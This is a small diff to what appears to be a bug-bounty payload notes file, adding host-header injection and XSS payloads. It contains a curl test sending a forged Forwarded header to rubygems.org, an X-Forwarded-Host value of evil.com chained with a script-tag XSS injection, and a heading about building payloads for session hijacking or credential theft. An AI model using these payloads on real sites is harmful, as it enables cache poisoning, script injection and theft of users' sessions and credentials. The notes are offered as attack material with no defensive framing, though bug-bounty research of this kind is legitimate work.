@@ -85,6 +85,11 @@ font: https://hackerone.com/reports/2627221
 test PoC
 |_curl -v -H "Forwarded: host=pup-e.com" https://rubygems.org
 
+
+X-Forwarded-Host: evil.com + XSS
+|_evil.com"><script>alert(1)</script>
+Font:https://www.youtube.com/watch?v=IUBsqO-cl7o
+
 chain xss and htmli
 
 Create an Advanced Payload for Session Hijacking or Credential Theft:
